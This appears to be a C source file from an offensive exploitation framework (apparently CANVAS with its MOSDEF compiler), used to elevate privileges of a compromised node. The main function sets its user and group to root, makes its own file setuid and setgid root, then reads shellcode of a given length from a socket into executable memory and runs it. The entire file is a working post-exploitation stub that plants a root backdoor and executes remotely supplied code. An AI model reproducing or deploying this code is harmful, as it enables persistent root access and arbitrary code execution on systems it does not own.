//
// code compiling with gcc and MOSDEF
//
// this file is used in DSU to elevate priviledges of a MOSDEF node.
//

#include <stddef.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#ifdef __MOSDEF__
# include <mosdef/asm.h>
#endif

#ifdef __MOSDEF__
# define sizeof(len) 4
#import "string", "FILENAME" as "FILENAME"
#import "int", "SOCK" as "SOCK"
#else
# define callptr(ptr) ((void(*)())(ptr))()
#endif

//XXX: problem, ifndef gets checked in remoteresolver self.vars, but vars['SOCK'] is set 
//     local to compile() only, not to self.vars
//#ifndef SOCK
//# define SOCK 666
//#endif
//XXX: so have to take this out so that 'SOCK' is assumed (only exists in local compile vars)

// XXX: this breaks DSU from CANVAS .. commenting out for now

//#ifndef FILENAME
//# define FILENAME argv[0]
//#endif


int
main(int argc, char **argv)
{
	int ret;
	int len;
	void *m;
	char **filename;

	filename = FILENAME;
	setuid(0);
	setgid(0);
	chown(filename, 0, 0);
	chmod(filename, 06755);

	ret = read(SOCK, &len, sizeof(len));
	if (ret != sizeof(len)) {
		_exit(3);
	}

	m = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (m == MAP_FAILED) {
		_exit(4);
	}

	ret = read(SOCK, m, len);
	if (ret != len) {
		_exit(5);
	}

        // little faux read syscall to flush icache on PPC .. should not hurt anything elsewhere ..
        read(0, 0, 0);

	callptr(m);

	_exit(7);

	return 0;
}
